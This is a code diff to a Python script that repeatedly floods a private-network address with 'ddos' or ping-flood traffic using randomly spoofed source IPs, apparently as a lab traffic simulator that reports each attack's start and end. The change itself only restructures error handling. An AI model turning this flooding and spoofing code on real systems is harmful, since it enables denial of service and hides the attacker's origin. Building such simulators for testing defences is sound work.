@@ -20,11 +20,11 @@ async def simulate_attack(target_ip):
     print(f"Simulating {attack_type.upper()} attack")
     attack_codes = {'ddos': 0xC0, 'ping_flood': 0xC2}
 
-    await send_attack_notification(attack_type, is_start=True)
-
-    num_packets = random.randint(500, 10000) if attack_type == 'ddos' else random.randint(100, 2000)
-
     try:
+        await send_attack_notification(attack_type, is_start=True)
+
+        num_packets = random.randint(500, 10000) if attack_type == 'ddos' else random.randint(100, 2000)
+
         if attack_type == 'ddos':
             for _ in range(num_packets):
                 spoofed_ip = f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
@@ -40,13 +40,15 @@ async def simulate_attack(target_ip):
 
 if __name__ == "__main__":
     target_ip = "192.168.1.18"
-    while True:
-        try:
+    try:
+        while True:
             asyncio.run(simulate_attack(target_ip))
             sleep_time = random.randint(10, 60)
             print(f"Waiting {sleep_time} seconds before next attack")
             sleep(sleep_time)
-        except KeyboardInterrupt:
-            print("Interrupt received, stopping attacks.")
-            asyncio.run(send_attack_notification("normal", is_start=False))
-            break
+    except KeyboardInterrupt:
+        print("Interrupt received, stopping attacks.")
+        asyncio.run(send_attack_notification("normal", is_start=False))
+    except Exception as e:
+        print(f"An unexpected error occurred: {e}")
+        asyncio.run(send_attack_notification("normal", is_start=False))
